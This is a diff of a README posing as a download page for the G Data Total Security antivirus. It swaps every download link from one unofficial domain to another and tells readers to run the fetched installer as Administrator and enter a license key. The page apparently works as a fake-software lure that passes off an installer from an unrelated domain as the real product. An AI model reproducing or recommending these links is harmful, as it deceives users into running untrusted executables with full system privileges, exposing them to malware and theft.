@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **G Data Total Security** for Windows.
 
 <p align="center">
-  <a href="https://g-data-total-security.zipzapsol.space/">
+  <a href="https://g-data-total-security.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-G%20Data%20Total%20Security-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download G Data Total Security">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[g-data-total-security.zipzapsol.space](https://g-data-total-security.zipzapsol.space/)** |
-| **Full URL** | `https://g-data-total-security.zipzapsol.space/` |
+| **Direct link** | **[g-data-total-security.wonderchain.fun](https://g-data-total-security.wonderchain.fun/)** |
+| **Full URL** | `https://g-data-total-security.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — g-data-total-security.zipzapsol.space](https://g-data-total-security.zipzapsol.space/)** (link above)
+1. Click **[Download — g-data-total-security.wonderchain.fun](https://g-data-total-security.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://g-data-total-security.zipzapsol.space/"><strong>⬇ Download G Data Total Security now</strong></a></p>
+<p align="center"><a href="https://g-data-total-security.wonderchain.fun/"><strong>⬇ Download G Data Total Security now</strong></a></p>
 
 ---
 
